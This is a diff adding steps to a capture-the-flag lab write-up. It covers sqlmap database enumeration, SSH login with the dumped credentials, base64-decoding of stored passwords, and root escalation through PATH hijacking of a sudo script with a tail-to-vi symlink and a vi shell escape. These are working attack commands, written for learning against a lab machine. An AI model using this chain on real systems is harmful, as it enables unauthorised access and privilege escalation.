@@ -73,9 +73,51 @@ The website is vulnerable to SQLi with these three types:
 Now we want to know if we can gain access to the data base:``sqlmap -u http://192.168.239.5:8080/mercuryfacts/ --dbs --batch``
 ![alt text](image-13.png)
 We discovored two data bases: ``information_schema``; ``mercury``
+Lets see what tables we have in ``mercury``
+![alt text](image-14.png)
+![alt text](image-15.png)
+We have two tables for the data base mercury and one of them is the username & password
 
+We already know that this ip has an open port for the service ssh so now we are going to login to the ssh using these credentuals
 
+We have to try all logins until one is correct and we login:
+Just the last will work:``ssh webmaster@192.168.239.5``
+![alt text](image-16.png)
+We successfuly loged in now we list the content of that folder:``ls``
+![alt text](image-17.png)
+we can see the content of the file flag with this command: ``cat user_flag.txt``
+![alt text](image-18.png)
+Now to get root priviliges we have to search deeper
+We have to change directories: ``cd mercury_proj``
+![alt text](image-19.png)
+There could be root informations on the ``notes.txt`` we have to see whats inside: ``cat notes.txt``
+![alt text](image-20.png)
+There are encoded passwords we have to decode it using: ``echo 'bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK' | base64 -d`` and ``echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d``
+Now we have the password for ``webmaster`` & ``linuxmaster``
+![alt text](image-21.png)
+![alt text](image-22.png)
 
+We can now login with linuxmaster but first we have to open another terminal and then: ``ssh linuxmaster@192.168.239.5``
+![alt text](image-23.png)
+
+We have to see the rights and privileges of this user: ``sudo -l``
+![alt text](image-24.png)
+First we have to see the content of ``usr/bin/check_syslog.sh`` with: ``cat /usr/bin/check_syslog.sh``
+![alt text](image-25.png)
+Here we have a script that executes the tail program for reading the last 10 log entrys
+We will create a link to a file or directory using the vi editor:``ln -s /usr/bin/vi tail``
+Now we have to export the local variable with this: ``export PATH=$(pwd):$PATH``
+we have to execute the file ``check_syslog.sh`` with: ``sudo --preserve-env=PATH /usr/bin/check_syslog.sh``
+It will open the ``check_syslog.sh`` in the vi editor
+![alt text](image-26.png)
+![alt text](image-27.png)
+
+In the vi editor we have to execute this line to have a shell: ``:!/bin/bash``
+
+Finally we change directory to the root: ``cd /root``
+![alt text](image-28.png)
+We finnally have the root flag
+![alt text](image-29.png)
 ---
 
 ## 📚 Enumeration & Analysis
